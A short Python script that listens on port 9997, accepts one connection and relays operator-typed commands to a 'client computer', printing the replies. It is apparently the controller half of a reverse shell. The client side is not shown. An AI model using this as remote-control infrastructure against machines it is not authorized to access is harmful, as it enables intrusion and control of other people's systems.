import socket, sys

#dynamically obtaining the server ip address and port assignment
host = socket.gethostbyname(socket.gethostname())
port = 9997
addr = (host, port)

#method to create socket
def create_socket():
    try:
        global server
        server = socket.socket()

    except socket.error as msg:
        print(f'[SOCKET CONNECTION ERROR:] {str(msg)}')

#binding the host and port 
#listening for connections from client
def bind_socket():
    try:
        print(f'[BINDING PORT:] {port}')
        server.bind(addr)
        server.listen(2) #number of bad connections the server is willing to listen to
    
    except socket.error as msg:
        print(f'[BINDING ERROR:] {str(msg)} \n [RETRYING...]')
        bind_socket()

#establishing a connection with a client --> the socket should be listening
def accept_socket():
    conn, addr = server.accept()
    print(f'[CONNECTION ESTABLISHED:] {host} {port}')
    send_command(conn)
    conn.close()

#sending commands to the client computer
def send_command(conn):
    #sending more than one command to a client
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            server.close()
            sys.exit()
        
        elif len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), 'utf-8')
            print(client_response, end='')

def main():
    create_socket()
    bind_socket()
    accept_socket()

main()

